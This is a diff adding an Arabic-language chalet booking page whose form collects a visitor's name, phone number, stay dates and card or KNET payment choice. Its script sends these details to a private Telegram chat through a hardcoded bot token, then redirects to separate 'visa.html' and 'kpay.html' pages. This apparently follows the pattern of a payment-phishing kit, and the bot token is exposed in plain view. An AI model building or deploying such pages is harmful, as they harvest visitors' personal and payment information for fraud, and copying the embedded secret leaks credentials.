@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>حجز الشاليه</title>
+  <style>
+    body {
+      font-family: 'Cairo', sans-serif;
+      background-color: #f9f9f9;
+      padding: 20px;
+      max-width: 600px;
+      margin: auto;
+    }
+
+    h2 {
+      color: #009688;
+      text-align: center;
+    }
+
+    form {
+      background-color: #ffffff;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+
+    input, select, textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    button {
+      margin-top: 20px;
+      background-color: #009688;
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #00796b;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>تأكيد الحجز   </h2>
+
+  <form id="booking-form">
+    <label for="name">الاسم الكامل:</label>
+    <input type="text" id="name" name="name" required>
+
+    <label for="phone">رقم الجوال:</label>
+<input type="tel" id="phone" name="phone" required pattern="^[569]\d{7}$" placeholder="XXXXXXXXX">
+
+    <label for="checkin">تاريخ الوصول:</label>
+    <input type="date" id="checkin" name="checkin" required>
+
+    <label for="checkout">تاريخ المغادرة:</label>
+    <input type="date" id="checkout" name="checkout" required>
+
+    <label for="payment">طريقة الدفع:</label>
+    <select id="payment" name="payment" required>
+      <option value="">اختر</option>
+      <option value="visa">فيزا / ماستركارد</option>
+      <option value="knet">كي نت</option>
+    </select>
+
+    <label for="notes">ملاحظات إضافية (اختياري):</label>
+    <textarea id="notes" name="notes" rows="3"></textarea>
+
+    <button type="submit">تأكيد الحجز</button>
+  </form>
+
+  <script>
+    // تحديد تاريخ اليوم في خانة تاريخ الوصول
+    const today = new Date().toISOString().split('T')[0];
+    const checkinInput = document.getElementById('checkin');
+    const checkoutInput = document.getElementById('checkout');
+
+    checkinInput.setAttribute('min', today);
+    checkinInput.addEventListener('change', function() {
+      const selectedDate = this.value;
+      checkoutInput.value = '';
+      checkoutInput.setAttribute('min', selectedDate);
+    });
+document.getElementById('booking-form').addEventListener('submit', function(event) {
+  event.preventDefault();
+
+  const name = document.getElementById('name').value;
+  const phone = document.getElementById('phone').value;
+  const checkin = document.getElementById('checkin').value;
+  const checkout = document.getElementById('checkout').value;
+  const payment = document.getElementById('payment').value;
+  const notes = document.getElementById('notes').value;
+
+  // التحقق من صحة التواريخ
+  if (new Date(checkout) <= new Date(checkin)) {
+    alert('تاريخ المغادرة يجب أن يكون بعد تاريخ الوصول.');
+    return;
+  }
+    localStorage.setItem("userName", name);
+
+
+  // ✅ إعداد الرسالة
+  const message = `
+🛏️ تم استلام حجز جديد:
+
+👤 الاسم: ${name}
+📱 الجوال: ${phone}
+📅 تاريخ الوصول: ${checkin}
+📅 تاريخ المغادرة: ${checkout}
+💳 طريقة الدفع: ${payment === 'visa' ? 'فيزا / ماستركارد' : 'كي نت'}
+📝 ملاحظات: ${notes || 'لا توجد'}
+`;
+
+  // ✅ إعداد بيانات API
+  const token = '8029079085:AAHz-G_SEaTy3VcNuWBfERpTPDrEhPGuTac';
+  const chatId = '7595871538';
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'HTML'
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.ok) {
+
+      if (payment === 'visa') {
+        window.location.href = 'visa.html';
+      } else if (payment === 'knet') {
+        window.location.href = 'kpay.html';
+      }
+    } else {
+      alert('حدث خطأ أثناء إرسال الطلب. حاول مرة أخرى.');
+    }
+  })
+  .catch(error => {
+    console.error('Telegram Error:', error);
+    alert('تعذر الاتصال بتيليجرام.');
+  });
+});
+
+
+
+  </script>
+
+</body>
+</html>
